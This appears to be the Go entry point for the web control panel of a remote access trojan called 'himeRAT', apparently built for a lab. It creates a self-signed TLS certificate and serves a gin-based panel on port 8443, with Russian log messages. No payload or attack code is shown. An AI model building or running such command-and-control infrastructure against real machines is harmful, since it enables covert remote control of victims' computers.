package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"log"
	"math/big"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/gin-gonic/gin"

	"himerat/db"
	"himerat/routes"
)

func ensureCerts(certPath, keyPath string) {
	if _, err := os.Stat(certPath); err == nil {
		return
	}
	_ = os.MkdirAll(filepath.Dir(certPath), 0o755)
	key, _ := rsa.GenerateKey(rand.Reader, 2048)
	tmpl := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "himeRAT-lab"},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	der, _ := x509.CreateCertificate(rand.Reader, &tmpl, &tmpl, &key.PublicKey, key)
	_ = os.WriteFile(certPath, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}), 0o644)
	pk := x509.MarshalPKCS1PrivateKey(key)
	_ = os.WriteFile(keyPath, pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: pk}), 0o600)
	log.Println("[i] Создан самоподписанный TLS-сертификат")
}

func main() {
	db.InitDB()
	defer db.DB.Close()

	gin.SetMode(gin.ReleaseMode)
	router := gin.Default()
	router.Static("/css", filepath.Join("templates", "css"))
	router.LoadHTMLGlob(filepath.Join("templates", "*.html"))
	routes.InitRoutes(router)

	addr := os.Getenv("WEB_ADDR")
	if addr == "" {
		addr = ":8443"
	}
	cert := os.Getenv("TLS_CERT")
	key := os.Getenv("TLS_KEY")
	if cert == "" {
		cert = "../certs/cert.pem"
	}
	if key == "" {
		key = "../certs/key.pem"
	}
	ensureCerts(cert, key)
	log.Printf("[i] Панель управления https://localhost%s", addr)
	log.Fatal(http.ListenAndServeTLS(addr, cert, key, router))
}
